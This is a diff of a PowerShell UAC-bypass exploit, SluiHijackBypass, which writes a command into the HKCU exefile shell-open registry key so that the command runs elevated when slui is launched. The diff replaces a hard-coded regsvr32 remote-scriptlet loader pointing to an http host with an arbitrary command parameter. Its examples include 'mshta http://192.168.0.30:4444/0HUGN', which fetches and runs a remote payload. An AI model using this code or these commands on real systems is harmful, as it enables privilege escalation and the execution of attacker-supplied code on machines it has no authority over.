@@ -9,25 +9,26 @@
 	https://github.com/gushmazuko/tools/blob/master/SluiHijackBypass.ps1
 	Original source: https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation
 .EXAMPLE
-	Load "regsvr32 -s -n -u -i:http://192.168.0.10/runner.cst scrobj.dll" (By Default used 'arch 64'):
-	SluiHijackBypass -http "http://192.168.0.10/runner.cst" -arch 64
+	Load "cmd.exe" (By Default used 'arch 64'):
+	SluiHijackBypass -command "cmd.exe" -arch 64
+	
+	Load "mshta http://192.168.0.30:4444/0HUGN"
+	SluiHijackBypass -command "mshta http://192.168.0.30:4444/0HUGN"
 #>
 
 function SluiHijackBypass(){
 	Param (
 
 		[Parameter(Mandatory=$True)]
-		[String]$http,
+		[String]$command,
 		[ValidateSet(64,86)]
 		[int]$arch = 64
 	)
 
-	$program = "regsvr32 -s -n -u -i:$http scrobj.dll"
-
 	#Create registry structure
 	New-Item "HKCU:\Software\Classes\exefile\shell\open\command" -Force
 	New-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "DelegateExecute" -Value "" -Force
-	Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value $program -Force
+	Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value $command -Force
 
 	#Perform the bypass
 	switch($arch)
